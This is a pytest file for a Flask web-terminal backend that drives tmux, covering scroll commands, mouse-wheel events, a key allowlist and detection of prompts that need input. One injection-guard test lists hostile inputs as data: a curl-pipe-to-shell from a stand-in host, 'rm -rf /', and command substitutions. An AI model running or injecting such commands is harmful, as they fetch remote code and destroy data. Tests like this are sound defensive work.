"""Terminal scroll contract.

Scrolling the web terminal goes through tmux *copy-mode commands*
(`send-keys -X ...`), never raw arrow/page keys. A raw `Up`/`PageUp` only
moves the copy cursor inside the visible pane and doesn't touch scrollback
until the cursor hits the top row — which made touch-drag scroll (mode=lines)
silently do nothing. These tests pin the `-X` form so that regression can't
come back.
"""
import json
import re

import pytest
from flask import Flask

import store
from routes import terminal


@pytest.fixture
def term_client(data_dir, tmp_path, monkeypatch):
    """Minimal app with terminal routes; tmux calls are captured, not run.

    Depends on `data_dir` (and patches store.CONTENT_DIR too): the "Enter" key
    send on the `chat` session now goes through terminal._pending_pop(), which
    reads/writes terminal_pending.json via store.mutate() -- without this the
    key-send tests below would hit the real on-disk store.
    """
    calls = []

    # client._mouse toggles what the mouse_any_flag probe reports: "0" = plain
    # shell (copy-mode path), "1" = full-screen TUI like Claude (wheel path).
    state = {"mouse": "0"}

    def fake_tmux(cmd_str):
        calls.append(cmd_str)
        out = state["mouse"] if "mouse_any_flag" in cmd_str else ""

        class _R:
            stdout = out
        return _R()

    monkeypatch.setattr(terminal, "_tmux", fake_tmux)
    monkeypatch.setattr(store, "CONTENT_DIR", tmp_path / "content")
    # `chat` is a default session, so _get_session accepts it without a file.
    app = Flask(__name__)
    app.config.update(TESTING=True)
    terminal.register(app)
    client = app.test_client()
    client._tmux_calls = calls
    client._state = state
    return client


def _scroll(client, **body):
    body.setdefault("session", "chat")
    return client.post("/api/terminal/scroll", json=body)


def _scroll_calls(client):
    """tmux calls excluding the mouse_any_flag probe."""
    return [c for c in client._tmux_calls if "mouse_any_flag" not in c]


def test_lines_scroll_uses_copy_mode_command_not_raw_keys(term_client):
    resp = _scroll(term_client, direction="up", mode="lines", lines=12)
    assert resp.status_code == 200
    cmds = term_client._tmux_calls
    # enters copy-mode with -e (so a down-scroll to the bottom auto-exits),
    # then issues the buffer-scroll command with a repeat count
    assert any(c == "copy-mode -e -t chat" for c in cmds)
    assert any("-X -N 12 scroll-up" in c for c in cmds)
    # never sends a bare arrow key (the old, broken behavior)
    assert not any(c.endswith("Up") or " Up Up" in c for c in cmds)


def test_lines_scroll_down_and_line_cap(term_client):
    _scroll(term_client, direction="down", mode="lines", lines=999)
    cmds = term_client._tmux_calls
    # lines are capped at 50 to keep a single drag bounded
    assert any("-X -N 50 scroll-down" in c for c in cmds)


def test_page_scroll_uses_x_command(term_client):
    _scroll(term_client, direction="up", mode="page")
    assert any("-X page-up" in c for c in term_client._tmux_calls)


def test_jump_to_bottom_cancels_copy_mode_not_history_bottom(term_client):
    # The escape hatch back to the live tail must exit copy-mode outright;
    # `history-bottom` would park at the end but stay frozen in copy-mode.
    _scroll(term_client, direction="down", mode="end")
    cmds = term_client._tmux_calls
    assert any("-X cancel" in c for c in cmds)
    assert not any("history-bottom" in c for c in cmds)
    # and it shouldn't bother (re-)entering copy-mode just to cancel
    assert not any(c.startswith("copy-mode") for c in cmds)


def test_scroll_to_top_uses_history_top(term_client):
    _scroll(term_client, direction="up", mode="end")
    assert any("-X history-top" in c for c in term_client._tmux_calls)


# --- Full-screen TUI (Claude) path: send mouse-wheel events, not copy-mode ---

# SGR mouse-wheel: ESC[<64;col;row M = up, ESC[<65;col;row M = down. Mirror the
# production encoder so expectations match byte-for-byte (the whole repeated
# sequence is hex-joined at once, so event boundaries carry a space too).
def _wheel_hex(up, count, col=2, row=2):
    seq = f"\033[<{64 if up else 65};{col};{row}M" * count
    return " ".join(f"{b:02x}" for b in seq.encode())


def test_tui_lines_scroll_sends_wheel_events_not_copy_mode(term_client):
    term_client._state["mouse"] = "1"  # foreground app owns the mouse (Claude)
    _scroll(term_client, direction="up", mode="lines", lines=3)
    cmds = _scroll_calls(term_client)
    # one batched send-keys -H of three wheel-up events; never enters copy-mode
    assert cmds == [f"send-keys -t chat -H {_wheel_hex(True, 3)}"]
    assert not any("copy-mode" in c for c in cmds)


def test_tui_scroll_down_sends_wheel_down(term_client):
    term_client._state["mouse"] = "1"
    _scroll(term_client, direction="down", mode="lines", lines=2)
    cmds = _scroll_calls(term_client)
    assert cmds == [f"send-keys -t chat -H {_wheel_hex(False, 2)}"]


def test_tui_jump_to_bottom_bursts_until_pane_settles(term_client):
    term_client._state["mouse"] = "1"
    _scroll(term_client, direction="down", mode="end")
    burst = f"send-keys -t chat -H {_wheel_hex(False, terminal._WHEEL_END_BURST)}"
    sends = [c for c in _scroll_calls(term_client) if c.startswith("send-keys")]
    # wheel bursts repeat until capture-pane stops changing (the fake pane
    # never changes, so: one real burst + one confirming it hit the edge) —
    # the loop itself is pinned by tests/test_terminal_scroll.py
    assert sends == [burst, burst]
    assert any(c.startswith("capture-pane") for c in _scroll_calls(term_client))
    assert not any("cancel" in c for c in term_client._tmux_calls)


# --- /api/terminal/send key allowlist (command-injection guard) ---

@pytest.mark.parametrize("key", ["Enter", "Escape", "C-c", "M-Up", "F5", "DC", "BSpace"])
def test_send_accepts_valid_tmux_key_names(term_client, key):
    resp = term_client.post("/api/terminal/send", json={"session": "chat", "key": key})
    assert resp.status_code == 200
    # the key reaches tmux verbatim as a send-keys argument
    assert any(c == f"send-keys -t chat {key}" for c in _scroll_calls(term_client))


@pytest.mark.parametrize("payload", [
    "; curl evil.sh | sh #",
    "Enter; rm -rf /",
    "$(whoami)",
    "`id`",
    "a b",            # space would split into extra shell words
    "'",              # quote-break attempt
    "x" * 21,         # over the length cap
])
def test_send_rejects_injection_in_key(term_client, payload):
    resp = term_client.post("/api/terminal/send", json={"session": "chat", "key": payload})
    assert resp.status_code == 400
    # nothing was ever sent to tmux for the rejected key
    assert not any("send-keys" in c for c in _scroll_calls(term_client))


# --- /api/terminal/needs-input ------------------------------------------------

@pytest.fixture
def needs_input_client(monkeypatch, tmp_path):
    """Like term_client, but capture-pane output is per-session and
    configurable, since needs-input probes every session in sessions.json
    (seeded here explicitly — only `chat` is a protected default now)."""
    calls = []
    panes = {"chat": "", "dev": "", "other": ""}
    sessions_path = tmp_path / "sessions.json"
    sessions_path.write_text(json.dumps(list(panes)))
    monkeypatch.setattr(terminal, "SESSIONS_PATH", sessions_path)

    def fake_tmux(cmd_str):
        calls.append(cmd_str)
        m = re.search(r"-t (\S+)", cmd_str)
        sess = m.group(1) if m else None
        out = panes.get(sess, "") if "capture-pane" in cmd_str else ""

        class _R:
            stdout = out
        return _R()

    monkeypatch.setattr(terminal, "_tmux", fake_tmux)
    app = Flask(__name__)
    app.config.update(TESTING=True)
    terminal.register(app)
    client = app.test_client()
    client._panes = panes
    client._tmux_calls = calls
    return client


def test_needs_input_false_when_no_prompt_pending(needs_input_client):
    resp = needs_input_client.get("/api/terminal/needs-input")
    assert resp.status_code == 200
    assert resp.get_json()["sessions"] == {"chat": False, "dev": False, "other": False}


def test_needs_input_true_when_prompt_pattern_present(needs_input_client):
    needs_input_client._panes["dev"] = "Do you want to proceed? Allow?"
    data = needs_input_client.get("/api/terminal/needs-input").get_json()
    assert data["sessions"] == {"chat": False, "dev": True, "other": False}
